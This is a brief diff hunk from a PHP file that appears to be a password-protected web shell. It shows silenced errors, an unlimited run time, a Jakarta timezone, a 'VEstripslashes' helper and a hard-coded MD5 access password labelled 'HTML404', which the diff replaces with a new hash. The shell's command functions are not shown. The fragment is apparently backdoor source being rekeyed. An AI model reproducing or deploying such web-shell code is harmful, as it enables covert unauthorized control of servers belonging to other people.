@@ -3,7 +3,7 @@ session_start();
 set_time_limit(0);
 error_reporting(0);
 date_default_timezone_set("Asia/Jakarta");
-$auth_pass = "a44c690d3685466824a241147cacb54e"; // HTML404
+$auth_pass = "662858bc28d77ba786d627d1811fe2bf"; // HTML404
 if(get_magic_quotes_gpc()) { 	
 function VEstripslashes($array) { 		
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
